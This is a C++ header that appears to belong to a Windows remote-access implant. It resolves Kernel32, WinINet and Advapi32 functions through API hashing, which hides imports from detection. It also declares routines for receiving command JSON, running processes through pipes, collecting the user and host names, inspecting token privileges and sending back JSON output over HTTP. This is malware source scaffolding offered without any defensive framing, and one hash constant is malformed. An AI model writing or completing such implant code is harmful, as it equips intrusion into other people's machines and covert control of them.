#pragma once
#include <windows.h>
#include "wininet.h"
#include "networkManager.hpp"

#define DECL(x) decltype(x) * x;

#define KERNEL32_CREATEFILE    0xc5efccc3
#define KERNEL32_READFILE      0x3fd44a9a
#define KERNEL32_LOADLIB       0x8e336469
#define KERNEL32_FINDFIRST     0xf8720eb1
#define KERNEL32_FINDNEXT      0x25efe2de
#define KERNEL32_SETDIR        0xc16c070f
#define KERNEL32_GETDIR        0xcc16c830f
#define KERNEL32_GETENV        0x10970a34
#define KERNEL32_CLOSEHANDLE   0xd411d461
#define KERNEL32_USERNAME      0xe7cb7091
#define KERNEL32_HOSTNAME      0x50598496
#define KERNEL32_WRITEFILE     0xc1709c27
#define KERNEL_COPYFILE        0x3cff1812
#define KERNEL_MOVEFILE        0xbcf3d8d5
#define KERNEL_CREATEPROCESS   0x12301c6c
#define KERNEL_CREATEPIPE      0xc46c153b
#define WININET_OPENINTERNET   0x85acc295
#define WININET_CONNECTINERNET 0x00a86f66
#define WININET_OPENREQUEST    0x81eddc53
#define WININET_SENDREQUEST    0xf1a89fa7
#define WININET_READFILE       0xa7d53dd3
#define WININET_SETOPTION      0x2a15caae
#define WININET_ADDHEADERS     0x467c7c8e
#define WININET_CLOSEHANDLE    0x54eafe04


#define ADVAPI_OPENTOKEN       0x193333c2
#define ADVAPI_TOKENINFO       0x2a3d5e14
#define ADVAPI_LOOKUPPRIV      0xb391614d
#define KERNEL_COPYFILE        0x3cff1812
#define KERNEL_MOVEFILE        0xbcf3d8d5



struct MODULES {
	HMODULE K32;
	HMODULE WININET;
	HMODULE NTDLL;
	HMODULE ADVAPI;
};


struct WINAPIS {
	// Kernel32
	DECL(ReadFile);
	DECL(WriteFile);
	DECL(CreateFileA);
	DECL(CloseHandle);
	DECL(LoadLibraryA);
	DECL(FindFirstFileA);
	DECL(CreateProcessA);
	DECL(CreatePipe);
	DECL(FindNextFileA);
	DECL(SetCurrentDirectoryA);
	DECL(GetCurrentDirectoryA);
	DECL(GetEnvironmentVariableA);
	DECL(GetUserNameA);
	DECL(GetComputerNameA);
	DECL(CopyFileA);
	DECL(MoveFileA);

	// Advapi32
	DECL(OpenProcessToken);
	DECL(GetTokenInformation);
	DECL(LookupPrivilegeNameA);
};






bool LoadApis();
FARPROC getAddress(HMODULE dll, DWORD hash);
DWORD Hasher(const char* str);
extern WINAPIS  * WinApis;
extern HTTPAPIS * HttpApis;
extern MODULES  * KModules;

BOOL AllocateAndLoadNeeded();
BOOL ParseCommandJson(PCHAR CommandString);
BOOL CraftOutputJson(PCHAR CommandID, PCHAR outputData, _Out_ PCHAR* JsonOutput);
SIZE_T CaluclateSizeOfFinalJson(SIZE_T OutputSize, SIZE_T CommandIdSize);

template<typename T>
T* AllocMemory(SIZE_T size) {
	return (T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}


